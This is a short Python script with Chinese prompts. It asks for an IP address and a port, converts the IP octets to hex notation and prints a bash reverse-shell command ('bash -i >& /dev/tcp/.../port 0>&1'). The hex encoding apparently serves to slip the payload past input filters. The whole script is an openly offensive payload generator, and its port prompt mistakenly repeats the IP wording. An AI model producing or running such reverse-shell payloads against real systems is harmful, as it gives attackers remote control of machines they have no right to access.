print("请输入您的ip:")
ip = input()
print("请输入您的ip:")
port = input()
a = ip.split('.')
str = ""
for i in range(0,4):
 if(i<3):
  str += hex(int(a[i]))+"."
 else:
  str += hex(int(a[i]))
	
exp = "bash -i >& /dev/tcp/"+str+"/"+port+" 0>&1"
print(exp)